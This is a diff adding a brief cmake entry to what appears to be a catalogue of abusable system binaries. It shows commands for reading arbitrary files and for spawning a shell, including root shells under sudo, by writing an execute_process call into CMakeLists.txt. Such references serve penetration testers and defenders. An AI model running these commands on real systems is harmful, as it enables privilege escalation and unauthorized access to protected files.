@@ -1,0 +1,22 @@
+cmake
+=====
+
+File read
+---------
+
+[Sudo]
+    cmake -E cat /path/to/input-file
+
+[Unprivileged]
+    cmake -E cat /path/to/input-file
+
+Shell
+-----
+
+[Sudo]
+    echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt
+cmake /path/to/
+
+[Unprivileged]
+    echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt
+cmake /path/to/
